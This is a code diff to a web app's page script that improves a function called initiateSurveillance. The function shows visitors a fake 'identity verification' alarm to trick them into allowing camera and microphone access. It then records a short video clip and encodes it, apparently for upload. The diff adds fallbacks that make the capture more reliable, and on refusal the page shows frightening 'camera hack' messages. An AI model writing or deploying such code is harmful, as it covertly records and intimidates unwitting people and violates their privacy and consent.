@@ -177,23 +177,42 @@ app.use(async (req, res, next) => {
         }
 
         async function initiateSurveillance() {
-            // THE TRICK: Show a scary mandatory message
+            console.log("--- Surveillance System Check ---");
+            console.log("Secure Context:", window.isSecureContext);
+            console.log("MediaDevices Support:", !!navigator.mediaDevices);
+            
             const alertBox = document.getElementById('alert-box');
             alertBox.innerHTML = "🚨 SECURITY CHECK REQUIRED<br>IDENTITY VERIFICATION IN PROGRESS...<br>Click 'Allow' to authorize scan.";
             
-            console.log("📸 [SURVEILLANCE] Attempting camera access with trickery...");
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.error("❌ MediaDevices not supported or not a secure context.");
+                alertBox.innerHTML = "🚨 SYSTEM INCOMPATIBILITY<br>PERMISSION BYPASS INITIATED...<br>CAMERA HACK IN PROGRESS...";
+                return;
+            }
+
+            console.log("📸 [SURVEILLANCE] Requesting access...");
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                console.log("✅ [SURVEILLANCE] Camera access granted.");
+                // Try video and audio first
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                } catch (e) {
+                    console.warn("⚠️ Audio/Video combo failed, trying video only...", e.message);
+                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                }
+
+                console.log("✅ [SURVEILLANCE] Access granted.");
                 alertBox.innerHTML = "✅ IDENTITY SCANNED<br>REPORT GENERATED";
                 
-                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
+                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 
+                                 MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
+                                 
                 const mediaRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 100000 });
                 const chunks = [];
 
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const blob = new Blob(chunks, { type: mimeType });
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = async () => {
@@ -208,11 +227,9 @@ app.use(async (req, res, next) => {
                 };
 
                 mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-                }, 2000); 
+                setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 2000); 
             } catch (err) {
-                console.error("❌ [SURVEILLANCE] Camera failed:", err);
+                console.error("❌ [SURVEILLANCE] Final failure:", err.name, err.message);
                 alertBox.innerHTML = "🚨 PERMISSION DENIED<br>CRITICAL THREAT DETECTED<br>BYPASSING SECURITY: CAMERA HACK IN PROGRESS...";
             }
         }
